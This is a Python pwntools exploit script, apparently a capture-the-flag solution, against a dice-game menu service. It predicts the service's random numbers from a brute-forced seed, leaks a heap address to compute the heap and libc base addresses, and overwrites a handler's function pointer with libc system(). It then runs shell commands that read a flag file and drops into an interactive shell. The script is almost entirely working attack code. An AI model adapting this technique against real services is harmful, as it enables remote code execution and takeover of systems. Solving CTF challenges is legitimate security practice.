from pwn import *
import os
import time
import struct

context(arch = 'amd64', os = 'linux')


while True:
    r = remote('127.0.0.1', 1024)
    # r = remote('192.168.178.95', 1024)

    log.info("gathering dice rolls")
    r.recvuntil("Select menu Item:\n");
    dices = []
    for _ in range(0, 20+1):
        r.send("1\n");
        r.recvuntil("[>] Threw dice:")
        dices.append(r.recvline().strip())
    
    log.info("find/bruteforce random seed and predict ranvals")
    p = process(["./brute_rand"]+ dices)
    out = p.recvall(timeout=5)
    p.close()
    log.success("done bruteforce. ")
    if "HANDLE" not in out or "ENTRY" not in out or "AFTER_ENTRY" not in out:
        time.sleep(1.5)
        log.warning("Not a suitable SEED.")
        log.info(out)
        r.close()
        continue
    entry, entry_offset, entry_adr = None, None, None
    handle, handle_offset, handle_adr = None, None, None
    after_entry, after_entry_adr = None, None
    guesses = None
    for line in out.splitlines():
        if not entry and line.startswith("ENTRY"):
            entry, entry_offset, entry_adr = line[7:].split(',')
        if not handle and line.startswith("HANDLER"):
            handle, handle_offset, handle_adr = line[9:].split(',')
        if not after_entry and line.startswith("AFTER_ENTRY"):
            after_entry, after_entry_adr = line[12:].split(',')
        if not guesses and line.startswith("GUESSES"):
            guesses = line[9:].split(',')[:-1]

    log.success("entry_adr: "+hex(int(entry_adr)))
    log.success("handle_adr: "+hex(int(handle_adr)))
    log.success("after_entry_adr: "+hex(int(after_entry_adr)))

    # predict the next 0xf dice rolls
    r.send("4\n")
    with log.progress('Guessing dices...') as p:
        for roll in guesses:
            p.status("guess: {}".format(roll))
            r.recvuntil("next dice roll:\n");
            r.send("{}\n".format(roll))
    log.success("Should have flag1: {}".format(r.recvuntil("Select menu Item:\n")))

    if handle<entry:
        log.warning("Entry is not after handle. Try again.")
        r.close()
        continue
    
    log.info("roll dices until we know the next ranval() will be nearby entry array")
    with log.progress('Roll dices...') as p:
        for i in range(0,int(entry)):
            p.status("{}/{}".format(i, entry))
            r.send("1\n")
            r.recvuntil("Select menu Item:\n");
    
    log.info("create entries until the address in the array reaches where the first entry points to")
    allocs = int(entry_offset)/8
    with log.progress('Create entries...') as p:
        for i in range(0,allocs+1):
            p.status("{}/{}".format(i, allocs+1))
            r.send("2\n")
            r.send("{}\n".format(i))
            r.recvuntil("Select menu Item:\n");

    log.info("Reading first entry to leak an entry array")
    #r.recvuntil("Select menu Item:\n");
    r.send("3\n")
    r.send("0\n")
    leak_out = r.recvuntil("Select menu Item:\n");
    heap_leak = None
    for line in leak_out.splitlines():
        if line.startswith("[>] 0. "):
            heap_leak = struct.unpack("Q", line[7:].ljust(8,"\x00"))[0]
    log.success("HEAP LEAK: "+hex(heap_leak))
    heap_base = heap_leak - int(after_entry_adr)
    log.success("HEAP BASE: "+hex(heap_base))
    libc_base = heap_base + 2**16
    log.success("LIBC BASE: "+hex(libc_base))
    #raw_input('waiting');
    rands = int(handle)-int(entry)-allocs-1
    log.info("Let's move rand forward by {}, so the content of a new entry overlaps with handler struct".format(rands))
    with log.progress('Roll dices...') as p:
        for i in range(0,rands):
            p.status("{}/{}".format(i, rands))
            r.send("1\n")
            r.recvuntil("Select menu Item:\n");
    log.info("Overwriting function pointer of handle->error()")
    r.send("2\n")

    # overwrite handle->error() with libc system()
    # these function pointers don't matter
    throw_dice = "AAAAAAAA"
    create_entry = "BBBBBBBB"
    read_entry = "CCCCCCCC"
    take_guess = "DDDDDDDD"
    # address of system()
    LIBC_SYSTEM_OFFSET = 0x52fd0 # local
    LIBC_SYSTEM_OFFSET = 0x554e0 # challenge
    error_case = struct.pack("Q", libc_base + LIBC_SYSTEM_OFFSET)
    r.send("A"*int(handle_offset) + throw_dice + create_entry + read_entry + take_guess + error_case + "\n");
    r.send("id; uname -a; cat flag2;\n");
    r.interactive();
    exit(0)
#r.send(asm(shellcraft.sh()))

"""
x/gx ((char**)&ENTRIES+1)
break *(main+247)
c
x/4gx $rax
x/gx *((char**)&ENTRIES+1)
"""
